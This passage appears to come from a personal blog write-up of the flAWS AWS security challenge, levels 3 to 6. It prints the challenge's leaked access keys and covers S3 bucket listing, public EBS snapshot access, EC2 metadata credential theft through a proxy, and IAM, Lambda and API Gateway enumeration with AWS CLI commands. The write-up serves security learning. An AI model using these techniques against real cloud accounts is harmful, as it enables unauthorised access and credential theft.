+<span class="o">[</span>Redacted]</code></pre></figure>
+
+<p>reading keys and next level path</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud/FLaws3]
+└─<span class="nv">$ </span><span class="nb">cat </span>access_keys.txt 
+access_key AKIAJ366LIPB4IJKT7SA
+secret_access_key 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
+
+┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud/FLaws3]
+└─<span class="nv">$ </span><span class="nb">cat </span>hint4.html     
+&lt;html&gt;
+    &lt;<span class="nb">head</span><span class="o">&gt;</span>
+        &lt;title&gt;flAWS&lt;/title&gt;
+        &lt;META <span class="nv">NAME</span><span class="o">=</span><span class="s2">"ROBOTS"</span> <span class="nv">CONTENT</span><span class="o">=</span><span class="s2">"NOINDEX, NOFOLLOW"</span><span class="o">&gt;</span>
+        &lt;style&gt;
+            body <span class="o">{</span> font-family: Andale Mono, monospace<span class="p">;</span> <span class="o">}</span>
+            :not<span class="o">(</span>center<span class="o">)</span> <span class="o">&gt;</span> pre <span class="o">{</span> background-color: <span class="c">#202020; padding: 4px; border-radius: 5px; border-color:#00d000; </span>
+            border-width: 1px<span class="p">;</span> border-style: solid<span class="p">;</span><span class="o">}</span> 
+        &lt;/style&gt;
+    &lt;/head&gt;
+&lt;body 
+  <span class="nv">text</span><span class="o">=</span><span class="s2">"#00d000"</span> 
+  <span class="nv">bgcolor</span><span class="o">=</span><span class="s2">"#000000"</span>  
+  <span class="nv">style</span><span class="o">=</span><span class="s2">"max-width:800px; margin-left:auto ;margin-right:auto"</span>
+  <span class="nv">vlink</span><span class="o">=</span><span class="s2">"#00ff00"</span> <span class="nb">link</span><span class="o">=</span><span class="s2">"#00ff00"</span><span class="o">&gt;</span>
+    
+&lt;center&gt;
+&lt;pre <span class="o">&gt;</span>
+ _____  _       ____  __    __  _____
+|     <span class="o">||</span> |     /    <span class="o">||</span>  |__|  |/ ___/
+|   __|| |    |  o  <span class="o">||</span>  |  |  <span class="o">(</span>   <span class="se">\_</span> 
+|  |_  | |___ |     <span class="o">||</span>  |  |  |<span class="se">\_</span>_  |
+|   _] |     <span class="o">||</span>  _  <span class="o">||</span>  <span class="sb">`</span>  <span class="s1">'  |/  \ |
+|  |   |     ||  |  | \      / \    |
+|__|   |_____||__|__|  \_/\_/   \___|
+&lt;/pre&gt;
+
+&lt;h1&gt;Level 3: Hint 4&lt;/h1&gt;
+&lt;/center&gt;
+
+The next level is at &lt;a href="http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud"&gt;http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud&lt;/a&gt;</span></code></pre></figure>
+
+<p>Listing all <code class="highlighter-rouge">s3 buckets</code> with these access keys</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud/FLaws3]
+└─<span class="nv">$ </span>aws s3 <span class="nb">ls</span> <span class="nt">--profile</span> flaws                                                                          
+2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
+2017-05-29 12:34:53 config-bucket-975426262029
+2017-02-12 15:03:24 flaws-logs
+2017-02-04 22:40:07 flaws.cloud
+2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
+2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
+2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud</code></pre></figure>
+
+<h4 id="level-3---summarized">Level 3 - Summarized</h4>
+
+<p><a href="/assets/documentation/Pasted image 20211023051108-c1045ed6353a27800df3fb27f112bbf5cca8cd5fb95d427ce0274e21c7f4dcbb.png">
+  <img src="/assets/documentation/Pasted image 20211023051108-c1045ed6353a27800df3fb27f112bbf5cca8cd5fb95d427ce0274e21c7f4dcbb.png" alt="Level 3" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023051108-c1045ed6353a27800df3fb27f112bbf5cca8cd5fb95d427ce0274e21c7f4dcbb.png" data-zooming-width="1920" data-zooming-height="876" />
+</a></p>
+
+<p>Always roll the secret keys, <code class="highlighter-rouge">always.. !</code></p>
+
+<h3 id="level-4">Level 4</h3>
+
+<p><a href="/assets/documentation/Pasted image 20211023051256-be931579b7198a1b86ad41cc19fa00a1db4a561b4933dcd42f0deea89d921d75.png">
+  <img src="/assets/documentation/Pasted image 20211023051256-be931579b7198a1b86ad41cc19fa00a1db4a561b4933dcd42f0deea89d921d75.png" alt="Level 4" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023051256-be931579b7198a1b86ad41cc19fa00a1db4a561b4933dcd42f0deea89d921d75.png" data-zooming-width="851" data-zooming-height="225" />
+</a></p>
+
+<p>Hmm.. finally we are getting to <code class="highlighter-rouge">EC2</code> eh..</p>
+
+<p><a href="/assets/documentation/Pasted image 20211023051345-2316cf9048a43323012c8a03e6184e3537f5e1da4f6ccb9de48b995b9a1c6e47.png">
+  <img src="/assets/documentation/Pasted image 20211023051345-2316cf9048a43323012c8a03e6184e3537f5e1da4f6ccb9de48b995b9a1c6e47.png" alt="Level 4" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023051345-2316cf9048a43323012c8a03e6184e3537f5e1da4f6ccb9de48b995b9a1c6e47.png" data-zooming-width="1920" data-zooming-height="898" />
+</a></p>
+
+<p>I cee, the challenge is to login, I am not entirely sure if this is a pure blackbox challenge or can we use the keys we got from previous challenge, for now lemme list the ec2</p>
+
+<p><code class="highlighter-rouge">I can't ;-;</code></p>
+
+<p>Also ffs, there are so many subcommands for EC2, I am totally clueless.. <em>hint ;-;</em></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>dig 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.16.15-Debian &lt;&lt;<span class="o">&gt;&gt;</span> 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+<span class="p">;;</span> global options: +cmd
+<span class="p">;;</span> Got answer:
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 25643
+;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1280
+;; QUESTION SECTION:
+;4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. IN A
+
+;; ANSWER SECTION:
+4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. 5 IN CNAME ec2-35-165-182-7.us-west-2.compute.amazonaws.com.
+ec2-35-165-182-7.us-west-2.compute.amazonaws.com. 5 IN A 35.165.182.7
+
+;; Query time: 20 msec
+;; SERVER: 192.168.119.2#53(192.168.119.2)
+;; WHEN: Sat Oct 23 09:32:49 EDT 2021
+;; MSG SIZE  rcvd: 159
+   
+┌──(fumenoid㉿kali)-[~]
+└─</span><span class="nv">$ </span><span class="sh">nslookup 35.165.182.7 
+7.182.165.35.in-addr.arpa       name = ec2-35-165-182-7.us-west-2.compute.amazonaws.com.
+
+Authoritative answers can be found from:</span></code></pre></figure>
+
+<p>Welp so we know its an EC2 hosted in <code class="highlighter-rouge">us-west-2</code> and it has a snapshot which is publicably viewable</p>
+
+<p>First we find account ID -</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>aws <span class="nt">--profile</span> flaws sts get-caller-identity
+<span class="o">{</span>
+    <span class="s2">"UserId"</span>: <span class="s2">"AIDAJQ3H5DC3LEG2BKSLC"</span>,
+    <span class="s2">"Account"</span>: <span class="s2">"975426262029"</span>,
+    <span class="s2">"Arn"</span>: <span class="s2">"arn:aws:iam::975426262029:user/backup"</span>
+<span class="o">}</span>
+┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>aws <span class="nt">--profile</span> flaws ec2 describe-snapshots <span class="nt">--region</span><span class="o">=</span>us-west-2                                                                                                                       255 ⨯
+<span class="o">{</span>
+    <span class="s2">"Snapshots"</span>: <span class="o">[</span>
+        <span class="o">{</span>
+            <span class="s2">"Description"</span>: <span class="s2">"snapshot of image.vmdk"</span>,
+            <span class="s2">"Encrypted"</span>: <span class="nb">false</span>,
+            <span class="s2">"OwnerId"</span>: <span class="s2">"099720109477"</span>,
+            <span class="s2">"Progress"</span>: <span class="s2">"100%"</span>,
+            <span class="s2">"SnapshotId"</span>: <span class="s2">"snap-08089fd5a6e9f307a"</span>,
+            <span class="s2">"StartTime"</span>: <span class="s2">"2018-04-23T16:28:08.000Z"</span>,
+            <span class="s2">"State"</span>: <span class="s2">"completed"</span>,
+            <span class="s2">"VolumeId"</span>: <span class="s2">"vol-ffffffff"</span>,
+            <span class="s2">"VolumeSize"</span>: 8
+        <span class="o">}</span>,
+                                <span class="o">[</span>REDACTED]
+                                <span class="o">[</span>A lot of data since we didn<span class="s1">'t specified account ID while searching, are these the snapshots of other..idk]
+                {
+            "Description": "",
+            "Encrypted": false,
+            "OwnerId": "975426262029",
+            "Progress": "100%",
+            "SnapshotId": "snap-0b49342abd1bdcb89",
+            "StartTime": "2017-02-28T01:35:12.000Z",
+            "State": "completed",
+            "VolumeId": "vol-04f1c039bc13ea950",
+            "VolumeSize": 8,
+            "Tags": [
+                {
+                    "Key": "Name",
+                    "Value": "flaws backup 2017.02.27"
+                }
+            ]
+        }
+    ]
+}</span></code></pre></figure>
+
+<p>Looking for snapshot after adding ID is simpler</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>aws <span class="nt">--profile</span> flaws ec2 describe-snapshots <span class="nt">--region</span><span class="o">=</span>us-west-2 <span class="nt">--owner-id</span><span class="o">=</span><span class="s2">"975426262029"</span>
+<span class="o">{</span>
+    <span class="s2">"Snapshots"</span>: <span class="o">[</span>
+        <span class="o">{</span>
+            <span class="s2">"Description"</span>: <span class="s2">""</span>,
+            <span class="s2">"Encrypted"</span>: <span class="nb">false</span>,
+            <span class="s2">"OwnerId"</span>: <span class="s2">"975426262029"</span>,
+            <span class="s2">"Progress"</span>: <span class="s2">"100%"</span>,
+            <span class="s2">"SnapshotId"</span>: <span class="s2">"snap-0b49342abd1bdcb89"</span>,
+            <span class="s2">"StartTime"</span>: <span class="s2">"2017-02-28T01:35:12.000Z"</span>,
+            <span class="s2">"State"</span>: <span class="s2">"completed"</span>,
+            <span class="s2">"VolumeId"</span>: <span class="s2">"vol-04f1c039bc13ea950"</span>,
+            <span class="s2">"VolumeSize"</span>: 8,
+            <span class="s2">"Tags"</span>: <span class="o">[</span>
+                <span class="o">{</span>
+                    <span class="s2">"Key"</span>: <span class="s2">"Name"</span>,
+                    <span class="s2">"Value"</span>: <span class="s2">"flaws backup 2017.02.27"</span>
+                <span class="o">}</span>
+            <span class="o">]</span>
+        <span class="o">}</span>
+    <span class="o">]</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>Alright here it gets fun and complicated, we can create our own <code class="highlighter-rouge">EC2 instance</code> using that <code class="highlighter-rouge">snapshot ID</code>.</p>
+
+<p>welp fuck I don’t have perms kyuki card link nahi h .. lol, copying screenshots of steps from hints.. : (</p>
+
+<p><a href="/assets/documentation/Pasted image 20211023100414-bcd941c455f268aec2678a685806eb212205a72d84233da30fa5c8233a79da9a.png">
+  <img src="/assets/documentation/Pasted image 20211023100414-bcd941c455f268aec2678a685806eb212205a72d84233da30fa5c8233a79da9a.png" alt="Level 4" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023100414-bcd941c455f268aec2678a685806eb212205a72d84233da30fa5c8233a79da9a.png" data-zooming-width="994" data-zooming-height="679" />
+</a></p>
+
+<p><a href="/assets/documentation/Pasted image 20211023100451-fcc80f60bcde1d5f59afe358e58f5c507ed7a6430c253973f91481b6620a39d7.png">
+  <img src="/assets/documentation/Pasted image 20211023100451-fcc80f60bcde1d5f59afe358e58f5c507ed7a6430c253973f91481b6620a39d7.png" alt="Level 4" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023100451-fcc80f60bcde1d5f59afe358e58f5c507ed7a6430c253973f91481b6620a39d7.png" data-zooming-width="885" data-zooming-height="244" />
+</a></p>
+
+<p><code class="highlighter-rouge">flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M</code></p>
+
+<p><a href="/assets/documentation/Pasted image 20211023100544-7407a4cc746ab63f86ebceb92fdd8e8b95a17a067871fcb1074daa67fe1d6b96.png">
+  <img src="/assets/documentation/Pasted image 20211023100544-7407a4cc746ab63f86ebceb92fdd8e8b95a17a067871fcb1074daa67fe1d6b96.png" alt="Level 4" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023100544-7407a4cc746ab63f86ebceb92fdd8e8b95a17a067871fcb1074daa67fe1d6b96.png" data-zooming-width="1920" data-zooming-height="586" />
+</a></p>
+
+<h4 id="level-4---summarized">Level 4 - Summarized</h4>
+
+<p><a href="/assets/documentation/Pasted image 20211023100824-c623dc87a62bf628735b69545e8a2010c1b4412db3a7c08c0c235ad2f4bad6cc.png">
+  <img src="/assets/documentation/Pasted image 20211023100824-c623dc87a62bf628735b69545e8a2010c1b4412db3a7c08c0c235ad2f4bad6cc.png" alt="Level 4" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023100824-c623dc87a62bf628735b69545e8a2010c1b4412db3a7c08c0c235ad2f4bad6cc.png" data-zooming-width="1920" data-zooming-height="494" />
+</a></p>
+
+<h3 id="level-5">Level 5</h3>
+
+<p><a href="/assets/documentation/Pasted image 20211023100902-d1ecd9cb49656566e14aafef8e3dc4fc1d661e1ece650590603412251804bae1.png">
+  <img src="/assets/documentation/Pasted image 20211023100902-d1ecd9cb49656566e14aafef8e3dc4fc1d661e1ece650590603412251804bae1.png" alt="Level 5" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023100902-d1ecd9cb49656566e14aafef8e3dc4fc1d661e1ece650590603412251804bae1.png" data-zooming-width="870" data-zooming-height="359" />
+</a></p>
+
+<p>We can use proxy to access internal metadata api of ec2, <code class="highlighter-rouge">169.254.169.254</code></p>
+
+<p><a href="/assets/documentation/Pasted image 20211023101804-a834f10240448e9d16d2c3d51931fca8b9ea5d8704bc739cf6c4eb7c55c813fa.png">
+  <img src="/assets/documentation/Pasted image 20211023101804-a834f10240448e9d16d2c3d51931fca8b9ea5d8704bc739cf6c4eb7c55c813fa.png" alt="Level 5" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023101804-a834f10240448e9d16d2c3d51931fca8b9ea5d8704bc739cf6c4eb7c55c813fa.png" data-zooming-width="1920" data-zooming-height="360" />
+</a></p>
+
+<p>now we can add these creds to <code class="highlighter-rouge">~/.aws/credentials</code> and then use it to list and download FLaws6 bucket</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud/Flaws5]
+└─<span class="nv">$ </span>aws s3 <span class="nb">cp </span>s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ <span class="nb">.</span> <span class="nt">--profile</span> flaws2 <span class="nt">--recursive</span>
+download: s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/index.html to ./index.html
+download: s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/hint2.html to ddcc78ff/hint2.html
+download: s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/hint1.html to ddcc78ff/hint1.html
+download: s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/index.html to ddcc78ff/index.html
+ 
+┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud/Flaws5]
+└─<span class="nv">$ </span><span class="nb">ls       
+</span>ddcc78ff  index.html</code></pre></figure>
+
+<h4 id="level-5---summarized">Level 5 - Summarized</h4>
+
+<p><a href="/assets/documentation/Pasted image 20211023103042-39fd66e390045c2875d7ed5539eab9b70ff0df9a6d5689fc6307d5767f34b0db.png">
+  <img src="/assets/documentation/Pasted image 20211023103042-39fd66e390045c2875d7ed5539eab9b70ff0df9a6d5689fc6307d5767f34b0db.png" alt="Level 5" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023103042-39fd66e390045c2875d7ed5539eab9b70ff0df9a6d5689fc6307d5767f34b0db.png" data-zooming-width="1920" data-zooming-height="839" />
+</a></p>
+
+<h3 id="level-6">Level 6</h3>
+
+<p><a href="/assets/documentation/Pasted image 20211023103541-614897719fa381eb48cdbb8b75780e27eed790c5b328117f8bb5758da5bbd91c.png">
+  <img src="/assets/documentation/Pasted image 20211023103541-614897719fa381eb48cdbb8b75780e27eed790c5b328117f8bb5758da5bbd91c.png" alt="Level 6" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023103541-614897719fa381eb48cdbb8b75780e27eed790c5b328117f8bb5758da5bbd91c.png" data-zooming-width="892" data-zooming-height="265" />
+</a></p>
+
+<p>Configuring AWS account for level 6</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud]
+└─<span class="nv">$ </span>aws configure <span class="nt">--profile</span> flaws3                                                                    
+AWS Access Key ID <span class="o">[</span>None]: AKIAJFQ6E7BY57Q3OBGA
+AWS Secret Access Key <span class="o">[</span>None]: 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
+Default region name <span class="o">[</span>None]: 
+Default output format <span class="o">[</span>None]: </code></pre></figure>
+
+<p>Geting user ID</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud]
+└─<span class="nv">$ </span>aws <span class="nt">--profile</span> flaws3 iam get-user
+<span class="o">{</span>
+    <span class="s2">"User"</span>: <span class="o">{</span>
+        <span class="s2">"Path"</span>: <span class="s2">"/"</span>,
+        <span class="s2">"UserName"</span>: <span class="s2">"Level6"</span>,
+        <span class="s2">"UserId"</span>: <span class="s2">"AIDAIRMDOSCWGLCDWOG6A"</span>,
+        <span class="s2">"Arn"</span>: <span class="s2">"arn:aws:iam::975426262029:user/Level6"</span>,
+        <span class="s2">"CreateDate"</span>: <span class="s2">"2017-02-26T23:11:16Z"</span>
+    <span class="o">}</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>Reading attached user-policies to figure out a weakness</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud]
+└─<span class="nv">$ </span>aws <span class="nt">--profile</span> flaws3 iam list-attached-user-policies <span class="nt">--user-name</span> Level6
+<span class="o">{</span>
+    <span class="s2">"AttachedPolicies"</span>: <span class="o">[</span>
+        <span class="o">{</span>
+            <span class="s2">"PolicyName"</span>: <span class="s2">"list_apigateways"</span>,
+            <span class="s2">"PolicyArn"</span>: <span class="s2">"arn:aws:iam::975426262029:policy/list_apigateways"</span>
+        <span class="o">}</span>,
+        <span class="o">{</span>
+            <span class="s2">"PolicyName"</span>: <span class="s2">"MySecurityAudit"</span>,
+            <span class="s2">"PolicyArn"</span>: <span class="s2">"arn:aws:iam::975426262029:policy/MySecurityAudit"</span>
+        <span class="o">}</span>,
+        <span class="o">{</span>
+            <span class="s2">"PolicyName"</span>: <span class="s2">"AWSCompromisedKeyQuarantine"</span>,
+            <span class="s2">"PolicyArn"</span>: <span class="s2">"arn:aws:iam::aws:policy/AWSCompromisedKeyQuarantine"</span>
+        <span class="o">}</span>
+    <span class="o">]</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>As we know the ARN for the policy we can read it’s version id</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud]
+└─<span class="nv">$ </span>aws <span class="nt">--profile</span> flaws3 iam get-policy  <span class="nt">--policy-arn</span> arn:aws:iam::975426262029:policy/list_apigateways
+<span class="o">{</span>
+    <span class="s2">"Policy"</span>: <span class="o">{</span>
+        <span class="s2">"PolicyName"</span>: <span class="s2">"list_apigateways"</span>,
+        <span class="s2">"PolicyId"</span>: <span class="s2">"ANPAIRLWTQMGKCSPGTAIO"</span>,
+        <span class="s2">"Arn"</span>: <span class="s2">"arn:aws:iam::975426262029:policy/list_apigateways"</span>,
+        <span class="s2">"Path"</span>: <span class="s2">"/"</span>,
+        <span class="s2">"DefaultVersionId"</span>: <span class="s2">"v4"</span>,
+        <span class="s2">"AttachmentCount"</span>: 1,
+        <span class="s2">"PermissionsBoundaryUsageCount"</span>: 0,
+        <span class="s2">"IsAttachable"</span>: <span class="nb">true</span>,
+        <span class="s2">"Description"</span>: <span class="s2">"List apigateways"</span>,
+        <span class="s2">"CreateDate"</span>: <span class="s2">"2017-02-20T01:45:17Z"</span>,
+        <span class="s2">"UpdateDate"</span>: <span class="s2">"2017-02-20T01:48:17Z"</span>,
+        <span class="s2">"Tags"</span>: <span class="o">[]</span>
+    <span class="o">}</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>With both version id and ARN we can read the actual policy</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud]
+└─<span class="nv">$ </span>aws <span class="nt">--profile</span> flaws3 iam get-policy-version  <span class="nt">--policy-arn</span> arn:aws:iam::975426262029:policy/list_apigateways <span class="nt">--version-id</span> v4 
+<span class="o">{</span>
+    <span class="s2">"PolicyVersion"</span>: <span class="o">{</span>
+        <span class="s2">"Document"</span>: <span class="o">{</span>
+            <span class="s2">"Version"</span>: <span class="s2">"2012-10-17"</span>,
+            <span class="s2">"Statement"</span>: <span class="o">[</span>
+                <span class="o">{</span>
+                    <span class="s2">"Action"</span>: <span class="o">[</span>
+                        <span class="s2">"apigateway:GET"</span>
+                    <span class="o">]</span>,
+                    <span class="s2">"Effect"</span>: <span class="s2">"Allow"</span>,
+                    <span class="s2">"Resource"</span>: <span class="s2">"arn:aws:apigateway:us-west-2::/restapis/*"</span>
+                <span class="o">}</span>
+            <span class="o">]</span>
+        <span class="o">}</span>,
+        <span class="s2">"VersionId"</span>: <span class="s2">"v4"</span>,
+        <span class="s2">"IsDefaultVersion"</span>: <span class="nb">true</span>,
+        <span class="s2">"CreateDate"</span>: <span class="s2">"2017-02-20T01:48:17Z"</span>
+    <span class="o">}</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>This tells us that,we have ability to GET <code class="highlighter-rouge">arn:aws:apigateway:us-west-2::/restapis/*</code> some lamba function thingy.
+Reading Lambda functions we have access to,</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud]
+└─<span class="nv">$ </span>aws <span class="nt">--profile</span> flaws3 lambda list-functions <span class="nt">--region</span> us-west-2                                                              
+<span class="o">{</span>
+    <span class="s2">"Functions"</span>: <span class="o">[</span>
+        <span class="o">{</span>
+            <span class="s2">"FunctionName"</span>: <span class="s2">"Level6"</span>,
+            <span class="s2">"FunctionArn"</span>: <span class="s2">"arn:aws:lambda:us-west-2:975426262029:function:Level6"</span>,
+            <span class="s2">"Runtime"</span>: <span class="s2">"python2.7"</span>,
+            <span class="s2">"Role"</span>: <span class="s2">"arn:aws:iam::975426262029:role/service-role/Level6"</span>,
+            <span class="s2">"Handler"</span>: <span class="s2">"lambda_function.lambda_handler"</span>,
+            <span class="s2">"CodeSize"</span>: 282,
+            <span class="s2">"Description"</span>: <span class="s2">"A starter AWS Lambda function."</span>,
+            <span class="s2">"Timeout"</span>: 3,
+            <span class="s2">"MemorySize"</span>: 128,
+            <span class="s2">"LastModified"</span>: <span class="s2">"2017-02-27T00:24:36.054+0000"</span>,
+            <span class="s2">"CodeSha256"</span>: <span class="s2">"2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw="</span>,
+            <span class="s2">"Version"</span>: <span class="s2">"</span><span class="nv">$LATEST</span><span class="s2">"</span>,
+            <span class="s2">"TracingConfig"</span>: <span class="o">{</span>
+                <span class="s2">"Mode"</span>: <span class="s2">"PassThrough"</span>
+            <span class="o">}</span>,
+            <span class="s2">"RevisionId"</span>: <span class="s2">"98033dfd-defa-41a8-b820-1f20add9c77b"</span>,
+            <span class="s2">"PackageType"</span>: <span class="s2">"Zip"</span>,
+            <span class="s2">"Architectures"</span>: <span class="o">[</span>
+                <span class="s2">"x86_64"</span>
+            <span class="o">]</span>
+        <span class="o">}</span>
+    <span class="o">]</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>We get the <code class="highlighter-rouge">Rest-api</code> id with</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud]
+└─<span class="nv">$ </span>aws <span class="nt">--profile</span> flaws3 <span class="nt">--region</span> us-west-2 lambda get-policy <span class="nt">--function-name</span> Level6                                                                                                      2 ⨯
+<span class="o">{</span>
+    <span class="s2">"Policy"</span>: <span class="s2">"{</span><span class="se">\"</span><span class="s2">Version</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">2012-10-17</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Id</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">default</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Statement</span><span class="se">\"</span><span class="s2">:[{</span><span class="se">\"</span><span class="s2">Sid</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">904610a93f593b76ad66ed6ed82c0a8b</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Effect</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">Allow</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Principal</span><span class="se">\"</span><span class="s2">:{</span><span class="se">\"</span><span class="s2">Service</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">apigateway.amazonaws.com</span><span class="se">\"</span><span class="s2">},</span><span class="se">\"</span><span class="s2">Action</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">lambda:InvokeFunction</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Resource</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">arn:aws:lambda:us-west-2:975426262029:function:Level6</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Condition</span><span class="se">\"</span><span class="s2">:{</span><span class="se">\"</span><span class="s2">ArnLike</span><span class="se">\"</span><span class="s2">:{</span><span class="se">\"</span><span class="s2">AWS:SourceArn</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6</span><span class="se">\"</span><span class="s2">}}}]}"</span>,
+    <span class="s2">"RevisionId"</span>: <span class="s2">"98033dfd-defa-41a8-b820-1f20add9c77b"</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>Id - <code class="highlighter-rouge">s33ppypa75</code>
+At this point I am a bit unsure what i am doing as i haven’t ever delt with restapi and lambda in AWS.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud]
+└─<span class="nv">$ </span>aws <span class="nt">--profile</span> flaws3 <span class="nt">--region</span> us-west-2 apigateway get-stages <span class="nt">--rest-api-id</span> <span class="s2">"s33ppypa75"</span>
+<span class="o">{</span>
+    <span class="s2">"item"</span>: <span class="o">[</span>
+        <span class="o">{</span>
+            <span class="s2">"deploymentId"</span>: <span class="s2">"8gppiv"</span>,
+            <span class="s2">"stageName"</span>: <span class="s2">"Prod"</span>,
+            <span class="s2">"cacheClusterEnabled"</span>: <span class="nb">false</span>,
+            <span class="s2">"cacheClusterStatus"</span>: <span class="s2">"NOT_AVAILABLE"</span>,
+            <span class="s2">"methodSettings"</span>: <span class="o">{}</span>,
+            <span class="s2">"tracingEnabled"</span>: <span class="nb">false</span>,
+            <span class="s2">"createdDate"</span>: 1488155168,
+            <span class="s2">"lastUpdatedDate"</span>: 1488155168
+        <span class="o">}</span>
+    <span class="o">]</span>
+<span class="o">}</span></code></pre></figure>
+
